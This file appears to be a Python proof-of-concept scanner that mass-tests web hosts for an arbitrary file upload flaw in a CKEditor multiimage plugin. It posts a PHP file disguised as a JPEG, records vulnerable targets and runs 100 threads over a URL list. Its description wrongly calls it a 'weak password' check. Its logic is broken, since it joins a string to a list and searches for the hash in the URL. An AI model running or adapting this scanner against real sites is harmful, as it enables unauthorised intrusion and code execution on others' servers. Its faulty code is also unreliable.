import argparse,sys,requests,os,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description="Canal Admin weak password")
    parser.add_argument('-u','--url',help='Please input your attack url')
    parser.add_argument('-f','--file',help='Please input your attack file')
    args = parser.parse_args()
    
    if args.url and not args.file :
            poc(args.url)
               
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('/n',''))
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
            print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def banner():
    test="""
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████
"""
    print(test)
    # 漏洞检测poc模块
def poc(target):
    url = target+ "/Public/ckeditor/plugins/multiimage/dialogs/image_upload.php "
    headers = {
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundarydAPjrmyKewWuf59H",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "Content-Length": "0"
    }
    data = '------WebKitFormBoundarydAPjrmyKewWuf59H\n\rContent-Disposition: form-data; name="files"; filename="ceshi.php"\n\rContent-Type: image/jpg \n\r\n\r<?php echo md5("666");unlink(__FILE__);?>\n\r------WebKitFormBoundarydAPjrmyKewWuf59H--'
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5).text
        res2=re.findall('/image/uploads/(\w*)\.php',res)
        url2 = target+res2

        print(res)
        if "fae0b27c451c728867a567e8c1bb4e53" in url2:
                   with open(r'E:\Learning file\pythonxuexi\poc\poc1\rchang\1.xtx','a+') as f1:
                        f1.write(f'{target}\n')
                        print('[+++++++]'+target+'存在文件上传漏洞')
                        return True
        else:
             print('[-]不存在漏洞')
    except:
         print(f'[*]{target}'' is server error')
         return False

if __name__ == '__main__' :
    main()